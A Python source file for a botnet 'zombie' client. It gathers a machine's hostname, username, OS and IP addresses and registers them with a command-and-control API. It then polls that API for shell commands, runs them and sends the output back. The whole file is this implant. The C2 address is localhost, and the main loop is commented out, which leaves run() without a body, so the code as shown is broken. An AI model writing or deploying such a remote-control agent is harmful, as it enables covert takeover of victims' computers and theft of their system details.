
import sys
import json
import time
import requests


import utils.data as tools_data
import utils.commands as cmd

# CONSTANTS

HOST = "127.0.0.1"

PORT = 5000

URL_API_BOT = f"http://{HOST}:{PORT}/api/bot" 

DEBUG = True

# LOGIC

class Bot:

	def __init__(self):

		# Bot data

		self._uuid = None
		self._hostname = None
		self._username = None
		self._os = None
		self._remote_ip = None
		self._local_ip = None
		self._state = None
		self._location = None

	def _set_all_data(self):

		self._uuid = tools_data.get_uuid()
		self._hostname = tools_data.get_hostname()
		self._username = tools_data.get_username()
		self._os = tools_data.get_platform()
		self._remote_ip = tools_data.get_remote_ip()
		self._local_ip = tools_data.get_local_ip()
		self._state = ""
		self._location = ""

	def _get_data(self):

		return {

			"uuid": self._uuid,
			"hostname": self._hostname,
			"username": self._username,
			"os": self._os,
			"remote_ip": self._remote_ip,
			"local_ip": self._local_ip,
			"state": self._state,
			"location": self._location

		}

	def _create(self):

		headers = {'Content-type': 'application/json'}

		payload = self._get_data()

		response = requests.post(f"{URL_API_BOT}", data=json.dumps(payload), headers=headers)		

		success =  (response.json())["success"]

		return success

	def _update(self):

		headers = {'Content-type': 'application/json'}

		payload = self._get_data()

		response = requests.put(f"{URL_API_BOT}", data=json.dumps(payload), headers=headers)

		success = (response.json())["success"]

		if success:

			print("Se ha actualizado datos del zombie")

		else:

			print("No se ha podido actualizar datos")

	def _get_command(self):

		response = requests.get(f"{URL_API_BOT}/{self._uuid}/command")

		if response.json():

			return (response.json())["line"]


	def _send_output_from_command(self, output):

		headers = {'Content-type': 'application/json'}

		payload = { "output": output }

		response = requests.put(f"{URL_API_BOT}/{self._uuid}/command", data=json.dumps(payload), headers=headers)

		success = (response.json())["success"]

		return success

	def _delete_command(self):

		response = requests.delete(f"{URL_API_BOT}/{self._uuid}/command")

		success = (response.json())["success"]

		return success

	def _execute_command(self):

		cmdline = self._get_command()

		if not cmdline:

			return None

		output = cmd.get_output(cmdline)

		success = self._send_output_from_command(output)

		if not success:

			return None

		time.sleep(1)

		self._delete_command()

	def run(self):

		# while True:

		# 	self._set_all_data()

		# 	self._create()

		# 	self._update()

		# 	self._execute_command()


if __name__ == '__main__':
	
	bot = Bot()
	bot.run()